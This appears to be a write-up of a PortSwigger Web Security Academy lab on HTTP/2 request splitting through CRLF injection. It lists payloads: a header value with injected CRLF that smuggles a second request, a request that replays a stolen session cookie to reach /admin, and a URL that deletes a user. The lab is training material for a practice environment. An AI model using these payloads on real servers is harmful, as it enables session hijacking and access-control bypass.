## HTTP/2 request splitting via CRLF injection

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

### Solution Steps
To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the
Shift + Return
keys. Note that this feature is not available when you double-click on the header.

### Key Payloads
- `carlos`
- `/admin`
- `Shift + Return`
- `GET /`
- `\r\n`
- `bar\r\n\r\nGET /x HTTP/1.1\r\nHost: YOUR-LAB-ID.web-security-academy.net`
- `\r\n\r\n`
- `GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE`
- `/admin/delete?username=carlos`

### Indicators of Success
- Request desync between front/back-end
- Subsequent request poisoned
- Other user's request captured
- Cache poisoned via smuggling
- Access controls bypassed
---
*Source: PortSwigger Web Security Academy*
